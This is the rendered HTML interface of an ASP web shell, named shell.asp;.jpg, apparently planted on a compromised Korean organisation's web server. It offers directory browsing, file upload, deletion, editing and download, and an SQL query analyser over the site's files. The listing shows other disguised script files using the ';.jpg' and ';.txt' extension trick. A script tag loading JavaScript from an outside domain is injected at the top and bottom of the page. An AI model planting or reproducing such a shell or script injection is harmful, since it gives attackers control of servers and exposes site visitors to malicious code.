...
<SCRIPT SRC=http://www.forumbilim.tk/summer/ciz.js></SCRIPT>
...
<SCRIPT Language="VBScript">
sub getit(thestuff)
if right("D:\HomePage_2009\",1) <> "\" Then
   document.myform.txtpath.value = "D:\HomePage_2009\" & "\" & thestuff
Else
   document.myform.txtpath.value = "D:\HomePage_2009\" & thestuff
End If
document.myform.submit()
...
<font face=Courier>
<table><tr><td>
<form method="post" action="/shell.asp;.jpg" name="myform" >
<Table bgcolor=#505050 ><tr><td bgcolor=#505050 >
<font face=Arial size=-2 color=#ff8300 > PATH INFO : </font></td><td align=right ><font face=Arial size=-2 color=#ff8300 >Volume Label:</font> »õ º¼·ý </td></tr>
<tr><td colspan=2 cellpadding=2 bgcolor=#303030 ><font face=Arial size=-1 color=gray>Virtual: http://www.knrea.or.kr/shell.asp;.jpg</Font><BR><font face=wingdings color=Gray >1</font><font face=Arial size=+1 > D:\HomePage_2009\</Font>
<BR><input type=text width=40 size=60 name=txtpath value="D:\HomePage_2009\" ><input type=submit name=cmd value="  View  " >
</td></tr></form></table>
</td><td><center>
<table bgcolor=#505050 cellpadding=4><tr><td bgcolor=black ><a href="/shell.asp;.jpg?getDRVs=@&txtpath=D:\HomePage_2009"><font size=-2 face=arial>Retrieve Available Network Drives</a></td></tr>
<tr><td bgcolor=black align=right><A HREF="/shell.asp;.jpg?qa=@&txtpath=D:\HomePage_2009"><font size=-2 face=arial>SQL Query Analyser</A></td></tr>
<tr><td bgcolor=black  align=right><A HREF="/shell.asp;.jpg?logoff=@&...thankyou.for.using.ASpyder....~sir_shagalot!..[shagzzz.cjb.net]"><font size=-2 face=arial>+++LOGOFF+++</A></td></tr></table>
</td></tr></table>
<p align=center ><Table width=75% bgcolor=#505050 cellpadding=4 ><tr><td>
<form method="post" action="/shell.asp;.jpg" ><font face=arial size=-1 >Delete file from current directory:</font><BR>
<select size=1 name=ToDelete >
<option>------------------------------</option>"
<option>blank.htm</option><option>common.css</option><option>event.asp;.txt</option><option>global.asa</option><option>iframe_main_popup(20111130).asp</option><option>iframe_main_popup.asp</option><option>imgview2.asp;a.txt</option><option>index.htm</option><option>index.html</option><option>left6.swf</option><option>Login.html</option><option>main(110411).asp</option><option>main(20101231).asp</option><option>main(20110801).asp</option><option>main(20120109).asp</option><option>main.asp</option><option>main20090428.asp</option><option>member.asp</option><option>pop.htm</option><option>rattr.asp</option><option>robots.txt</option><option>shell.asp;.jpg</option><option>test.asp</option><option>test1.asp</option><option>trat35.txt</option><option>user_session_check.asp</option><option>user_session_check_close.asp</option><option>user_session_check_prove.asp</option><option>x.txt</option></select><input type=hidden name=txtpath value="D:\HomePage_2009"><input type=Submit name=cmd value=Delete ></form></td><td><form method=post name=frmCopyFile action="/shell.asp;.jpg" ><font face=arial size=-1 >Copy file too current directory:</font><br><select size=1 name=ToCopy ><option>------------------------------</option></select><input type=hidden name=txtpath value="D:\HomePage_2009"><input type=Submit name=cmd value="  Copy " ></form></td></tr></Table><table Cellpading=2 width=75% bgcolor=#505050 ><tr><td valign=top width=50% bgcolor=#303030 >Folders:<BR><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#c8c8c8><span style='cursor: hand;' OnClick="getit('..')">..</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('about')">about</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('admin_knrea')">admin_knrea</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('board_img')">board_img</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('business')">business</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('data')">data</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('doc')">doc</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('down')">down</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('energy')">energy</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('ENG')">ENG</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('flash')">flash</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('images')">images</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('include')">include</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('industry')">industry</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('info')">info</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('join')">join</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('JScript')">JScript</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('knrea_intranet')">knrea_intranet</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('login')">login</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('member')">member</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('MiraePopup')">MiraePopup</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('mypage')">mypage</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('news')">news</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('popup')">popup</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('q_a')">q_a</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('SMALL_CALENDAR')">SMALL_CALENDAR</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('total_board')">total_board</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('uesr_check')">uesr_check</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('UPLOAD')">UPLOAD</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('webediter')">webediter</span></FONT><BR><font face=wingdings color=Gray >0</font> <FONT COLOR=#eeeeee><span style='cursor: hand;' OnClick="getit('_vti_cnf')">_vti_cnf</span></FONT><BR>
<BR><center><form method=post action="/shell.asp;.jpg?txtpath=D:\HomePage_2009">
<table bgcolor=#505050 cellspacing=4><tr><td>
<font face=arial size=-1 title="Create and Delete folders by entering their names here manually.">Directory:</td></tr>
<tr><td align=right ><input type=text size=20 name=DirName><BR>
<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>
...
<BR></td><td valign=top width=50% bgcolor=#303030 >Files:<BR><BR>
	<form method=post name=frmCopySelected action="/shell.asp;.jpg?txtpath=D:\HomePage_2009">
<center><select name=Fname size=32 style="background-color: rgb(48,48,48); color: rgb(210,210,210)"><option value="blank.htm">&nbsp;&nbsp;blank.htm -- [1 kb]</option><option value="common.css">&nbsp;&nbsp;common.css -- [8 kb]</option><option value="event.asp;.txt">&nbsp;&nbsp;event.asp;.txt -- [1 kb]</option><option value="global.asa">&nbsp;&nbsp;global.asa -- [1 kb]</option><option value="iframe_main_popup(20111130).asp">&nbsp;&nbsp;iframe_main_popup(20111130).asp -- [8 kb]</option><option value="iframe_main_popup.asp">&nbsp;&nbsp;iframe_main_popup.asp -- [8 kb]</option><option value="imgview2.asp;a.txt">&nbsp;&nbsp;imgview2.asp;a.txt -- [1 kb]</option><option value="index.htm">&nbsp;&nbsp;index.htm -- [55 kb]</option><option value="index.html">&nbsp;&nbsp;index.html -- [1 kb]</option><option value="left6.swf">&nbsp;&nbsp;left6.swf -- [20 kb]</option><option value="Login.html">&nbsp;&nbsp;Login.html -- [14 kb]</option><option value="main(110411).asp">&nbsp;&nbsp;main(110411).asp -- [20 kb]</option><option value="main(20101231).asp">&nbsp;&nbsp;main(20101231).asp -- [20 kb]</option><option value="main(20110801).asp">&nbsp;&nbsp;main(20110801).asp -- [20 kb]</option><option value="main(20120109).asp">&nbsp;&nbsp;main(20120109).asp -- [20 kb]</option><option value="main.asp">&nbsp;&nbsp;main.asp -- [20 kb]</option><option value="main20090428.asp">&nbsp;&nbsp;main20090428.asp -- [17 kb]</option><option value="member.asp">&nbsp;&nbsp;member.asp -- [9 kb]</option><option value="pop.htm">&nbsp;&nbsp;pop.htm -- [2 kb]</option><option value="rattr.asp">&nbsp;&nbsp;rattr.asp -- [56 kb]</option><option value="robots.txt">&nbsp;&nbsp;robots.txt -- [1 kb]</option><option value="shell.asp;.jpg">&nbsp;&nbsp;shell.asp;.jpg -- [35 kb]</option><option value="test.asp">&nbsp;&nbsp;test.asp -- [1 kb]</option><option value="test1.asp">&nbsp;&nbsp;test1.asp -- [1 kb]</option><option value="trat35.txt">&nbsp;&nbsp;trat35.txt -- [1 kb]</option><option value="user_session_check.asp">&nbsp;&nbsp;user_session_check.asp -- [2 kb]</option><option value="user_session_check_close.asp">&nbsp;&nbsp;user_session_check_close.asp -- [1 kb]</option><option value="user_session_check_prove.asp">&nbsp;&nbsp;user_session_check_prove.asp -- [2 kb]</option><option value="x.txt">&nbsp;&nbsp;x.txt -- [1 kb]</option></select><br><input type=submit name=cmd value="   Copy   "><input type=submit name=cmd value="Edit/Create"><input type=submit name=cmd value=Download>
	</form>
<BR></td></tr><tr><td align=center ><B>Listed: 30</b></td><td align=center ><b>Listed: 29</b></td></tr></table><BR>
	<form method="post" ENCTYPE="multipart/form-data" action="/shell.asp;.jpg?upload=@&txtpath=D:\HomePage_2009">
<table bgcolor="#505050" cellpadding="8">
  <tr>
    <td bgcolor=#303030 valign="bottom"><font size=+1 face=wingdings color=Gray >2</font><font face="Arial" size=-2 color="#ff8300"> SELECT FILES TO UPLOAD:<br>
    <input TYPE="FILE" SIZE="53" NAME="FILE1"><BR>
...
</font><HR><P align=right><font color=#ff8300><TT>Copyright 2003 Vela iNC.</B></font><BR><font size=1 face=arial>[ System: 2012-03-12 ¿ÀÀü 2:16:11 ]</font></p><BR>
</body></html>
<SCRIPT SRC=http://www.forumbilim.tk/summer/ciz.js></SCRIPT>
